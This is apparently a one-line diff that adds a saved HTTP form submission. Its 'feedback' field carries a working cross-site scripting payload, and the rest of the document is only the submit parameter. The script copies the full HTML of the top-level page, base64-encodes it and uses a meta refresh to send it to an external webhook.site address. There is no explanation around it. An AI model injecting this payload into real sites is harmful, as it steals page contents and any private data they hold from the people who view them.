@@ -1,0 +1,1 @@
+feedback=<script>let h = new XMLSerializer().serializeToString(window.top.document); let g = ''.concat("<meta http-equiv='refresh' content='0; url=https://webhook.site/0ac54deb-d2db-403b-b093-6b515bb8d010?meta=",window.btoa(h),"' />"); document.write(g);</script>&submit=Submit+Query
